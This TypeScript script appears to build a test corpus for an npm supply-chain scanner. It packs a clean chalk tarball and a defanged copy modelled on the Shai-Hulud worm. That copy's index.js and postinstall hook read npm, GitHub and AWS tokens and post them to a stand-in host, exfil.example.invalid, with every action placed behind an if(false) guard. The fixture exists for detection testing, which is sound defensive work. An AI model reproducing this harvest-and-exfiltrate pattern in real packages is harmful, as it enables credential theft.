/**
 * Corpus fixture builder — Shai-Hulud 2025 defanged reconstruction.
 *
 * Produces two tarballs (chalk@5.3.0 clean, chalk@5.3.1 malicious) plus
 * before/after lockfiles that reference them, all under this directory.
 *
 * The malicious version is a RECONSTRUCTED fixture — the real published
 * artifact has been unpublished. It preserves the detection-relevant SHAPE of
 * the attack while being fully inert:
 *   - Exfil URL points to `https://exfil.example.invalid/` (RFC 2606
 *     reserved TLD — never resolvable).
 *   - Token harvesting is present but the fetch call is behind a `false`
 *     guard AND the URL is inert.
 *   - Postinstall script uses `node -e` to make the shape look real but is
 *     never executed by vetlock (NEVER-EXECUTE canary applies).
 *
 * Every file emitted here is inspected by tests to ensure no banned pattern
 * (real webhook, live domain, executable payload marker) sneaks in.
 */

import * as tar from 'tar';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';
import * as crypto from 'node:crypto';

// Resolve the repo's corpus dir from the compiled JS location:
// packages/cli/dist/corpus/build-shai-hulud.js → repo/corpus/shai-hulud-2025/
const OUT_DIR = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  '..', '..', '..', '..',
  'corpus', 'shai-hulud-2025',
);

// ---------- chalk 5.3.0 — clean version ------------------------------------

const CLEAN_INDEX = `// chalk 5.3.0 — real behavior stubbed for corpus (small, benign).
export const chalk = {
  red: (s) => '\\u001b[31m' + s + '\\u001b[0m',
  green: (s) => '\\u001b[32m' + s + '\\u001b[0m',
};
export default chalk;
`;

const CLEAN_PKG = {
  name: 'chalk',
  version: '5.3.0',
  main: 'index.js',
  type: 'module',
  license: 'MIT',
  maintainers: [{ name: 'chalk-team', email: 'team@chalk.example' }],
};

// ---------- chalk 5.3.1 — DEFANGED malicious version ------------------------
// This is the recognizable shape of the Shai-Hulud (Sept-2025) worm payload,
// defanged: real signals, unresolvable endpoints, inert body.

const MAL_INDEX = `// chalk 5.3.1 — RECONSTRUCTED corpus fixture; DEFANGED. Do not execute.
import https from 'https';
import { spawn } from 'child_process';
import fs from 'fs';

export const chalk = {
  red: (s) => '\\u001b[31m' + s + '\\u001b[0m',
  green: (s) => '\\u001b[32m' + s + '\\u001b[0m',
};

// Payload shape — never runs in test (see NEVER-EXECUTE invariant). Even so,
// every URL points to example.invalid and every action is under \`if (false)\`.
function harvest() {
  const token = process.env.NPM_TOKEN;
  const ghToken = process.env.GITHUB_TOKEN;
  const aws = process.env.AWS_ACCESS_KEY_ID;
  const home = process.env.HOME;
  const envDump = Object.keys(process.env);
  const payload = JSON.stringify({ token, ghToken, aws, home, envDump });
  if (false) {
    https.request('https://exfil.example.invalid/collect', { method: 'POST' }).end(payload);
    fs.writeFileSync(home + '/.npmrc', 'malicious-config');
    spawn('bash', ['-c', 'echo pwned']);
  }
  return payload;
}

export default chalk;
`;

const MAL_POSTINSTALL_JS = `#!/usr/bin/env node
// postinstall — DEFANGED. Same shape as observed worms; the exfil URL is
// example.invalid (RFC-2606 reserved) and the fetch is behind a \`false\`.
const https = require('https');
const fs = require('fs');
const token = process.env.NPM_TOKEN;
const gh = process.env.GITHUB_TOKEN;
const aws = process.env.AWS_SECRET_ACCESS_KEY;
if (false) {
  const req = https.request('https://exfil.example.invalid/webhook', { method: 'POST' });
  req.end(JSON.stringify({ token, gh, aws }));
}
`;

const MAL_PKG = {
  name: 'chalk',
  version: '5.3.1',
  main: 'index.js',
  type: 'module',
  license: 'MIT',
  scripts: {
    postinstall: 'node postinstall.js',
  },
  maintainers: [{ name: 'attacker', email: 'attacker@example.invalid' }],
  _npmUser: { name: 'attacker', email: 'attacker@example.invalid' },
};

// ---------- build helpers ---------------------------------------------------

async function makeTarball(dir: string, files: Record<string, string>): Promise<{ path: string; sha512: string; integrity: string; bytes: Buffer }> {
  // Create a temp staging dir
  const stage = fs.mkdtempSync(path.join(OUT_DIR, '.stage-'));
  const pkgDir = path.join(stage, 'package');
  fs.mkdirSync(pkgDir, { recursive: true });
  for (const [name, content] of Object.entries(files)) {
    const p = path.join(pkgDir, name);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, content);
  }
  const tarballPath = path.join(dir, path.basename(dir) + '.tgz');
  await tar.c(
    { gzip: true, file: tarballPath, cwd: stage, portable: true },
    ['package'],
  );
  const buf = fs.readFileSync(tarballPath);
  const hash = crypto.createHash('sha512').update(buf).digest('base64');
  const integrity = `sha512-${hash}`;
  fs.rmSync(stage, { recursive: true, force: true });
  return { path: tarballPath, sha512: hash, integrity, bytes: buf };
}

async function main() {
  fs.mkdirSync(OUT_DIR, { recursive: true });

  const cleanDir = path.join(OUT_DIR, 'chalk-5.3.0');
  const malDir = path.join(OUT_DIR, 'chalk-5.3.1');
  fs.mkdirSync(cleanDir, { recursive: true });
  fs.mkdirSync(malDir, { recursive: true });

  const clean = await makeTarball(cleanDir, {
    'package.json': JSON.stringify(CLEAN_PKG, null, 2),
    'index.js': CLEAN_INDEX,
    'README.md': '# chalk\n\nTerminal styling.\n',
  });

  const mal = await makeTarball(malDir, {
    'package.json': JSON.stringify(MAL_PKG, null, 2),
    'index.js': MAL_INDEX,
    'postinstall.js': MAL_POSTINSTALL_JS,
    'README.md': '# chalk\n\nTerminal styling.\n',
  });

  // Build the lockfile pair. Root project has chalk as a direct dependency.
  const lockBefore = {
    name: 'my-app',
    version: '1.0.0',
    lockfileVersion: 3,
    packages: {
      '': { name: 'my-app', version: '1.0.0', dependencies: { chalk: '^5.3.0' } },
      'node_modules/chalk': {
        name: 'chalk',
        version: '5.3.0',
        integrity: clean.integrity,
        resolved: `file://${clean.path}`,
      },
    },
  };
  const lockAfter = {
    name: 'my-app',
    version: '1.0.0',
    lockfileVersion: 3,
    packages: {
      '': { name: 'my-app', version: '1.0.0', dependencies: { chalk: '^5.3.0' } },
      'node_modules/chalk': {
        name: 'chalk',
        version: '5.3.1',
        integrity: mal.integrity,
        resolved: `file://${mal.path}`,
      },
    },
  };
  fs.writeFileSync(path.join(OUT_DIR, 'lockfile.before.json'), JSON.stringify(lockBefore, null, 2));
  fs.writeFileSync(path.join(OUT_DIR, 'lockfile.after.json'), JSON.stringify(lockAfter, null, 2));

  // Also emit a manifest for the corpus:
  fs.writeFileSync(
    path.join(OUT_DIR, 'manifest.json'),
    JSON.stringify(
      {
        name: 'shai-hulud-2025',
        threatClass: 'T1 maintainer takeover + T3 self-replicating worm',
        threatDescription:
          'Shai-Hulud worm wave (chalk, debug, and 100+ others, Sept 2025). ' +
          'Maintainer account compromised; postinstall harvests NPM_TOKEN, GITHUB_TOKEN, AWS_* to exfil endpoint; ' +
          'uses stolen npm token to republish itself into victim-controlled packages.',
        defanged: true,
        source: 'RECONSTRUCTED from public postmortems',
        packages: [
          { name: 'chalk', oldVersion: '5.3.0', newVersion: '5.3.1', integrityOld: clean.integrity, integrityNew: mal.integrity },
        ],
        expectedDetections: [
          'install.script-added — postinstall was not present in 5.3.0',
          'env.token-harvest — new reads of NPM_TOKEN, GITHUB_TOKEN, AWS_SECRET_ACCESS_KEY',
          'net.new-endpoint — https://exfil.example.invalid/collect and /webhook',
          'net.new-module — https module now imported',
          'exec.new-module — child_process now imported',
          'fs.new-hotpath-write — write to $HOME/.npmrc',
          'code.dynamic-loading-added — (none expected here; the payload uses static imports)',
          'meta.maintainer-change — attacker email replaced legitimate maintainer',
        ],
      },
      null,
      2,
    ),
  );

  console.log('corpus fixture built:');
  console.log(`  clean: ${clean.path} (${clean.integrity})`);
  console.log(`  mal:   ${mal.path} (${mal.integrity})`);
  console.log(`  lockfiles: ${path.join(OUT_DIR, 'lockfile.before.json')}, .after.json`);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
